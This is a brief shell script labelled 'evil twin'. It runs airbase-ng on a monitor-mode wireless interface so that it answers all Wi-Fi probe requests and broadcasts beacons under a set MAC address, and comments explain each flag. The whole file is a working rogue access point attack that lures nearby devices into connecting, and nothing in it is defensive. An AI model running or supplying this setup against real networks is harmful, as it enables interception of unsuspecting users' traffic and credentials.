#!/bin/sh

# evil twin
# respond to probe for an access point and generate respone and beacon frames

airbase-ng -P -C 10 -a AA:AA:AA:AA:AA:AA mon0 -v

# -P = respond to all probes
# -C 10 = enable beacons every x seconds
# -a AA:AA:AA:AA:AA:AA = mac address
# mon0 = monitor mode interface
# -v = verbose mode